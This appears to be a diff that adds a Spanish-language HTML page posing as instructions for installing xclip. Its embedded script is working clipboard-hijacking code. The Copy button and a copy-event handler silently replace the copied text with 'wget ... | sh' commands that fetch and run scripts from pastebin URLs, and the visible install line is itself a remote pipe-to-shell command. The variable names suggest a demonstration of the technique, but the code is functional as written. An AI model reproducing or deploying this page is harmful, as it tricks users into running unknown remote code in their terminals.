@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <meta name="description" content="">
+  <meta name="author" content="López Ricardo Ezequiel">
+
+
+  <script>
+      const evilCMD = 'wget -qO - https://pastebin.com/raw/SW3vmCQJ | sh';
+      const evilCMD2 = 'wget -qO - https://pastebin.com/raw/SmjUj8mD | sh';
+
+      const copy = () => {
+        const evilTextarea = document.createElement('textarea');
+        evilTextarea.innerText = evilCMD;
+        document.body.appendChild(evilTextarea);
+        evilTextarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(evilTextarea);
+      }
+
+      window.onload = function() {
+        var p = document.getElementById('p');
+        p.addEventListener('copy', oncopy);
+
+        function oncopy(a,b,c,d) {
+          var evilP = document.createElement('p');
+          document.body.appendChild(evilP);
+          evilP.innerHTML = evilCMD2;
+          var selection = document.getSelection();
+          var range = selection.getRangeAt(0);
+          selection.selectAllChildren(evilP);
+          setTimeout(function() {
+            evilP.parentNode.removeChild(evilP);
+            selection.removeAllRanges();
+            selection.addRange(range);
+          }, 0);
+        }
+      }
+  </script>
+</head>
+
+<body>
+
+  <h1>Instalar xclip</h1>
+
+  <p>
+    Primero actualizá las listas de paquetes
+  </p>
+  <p>
+    sudo apt-get update
+  </p>
+
+  <p>
+    Ejecuta el siguiente comando para Instalar xclip
+  </p>
+  <p id="p">
+      wget -qO - <a href="https://pastebin.com/raw/VPkYpVvp">https://pastebin.com/raw/VPkYpVvp</a> | sh
+  </p>
+
+
+  <br>
+  <button onclick="copy()">Copy</button>
+</body>
+
+</html>
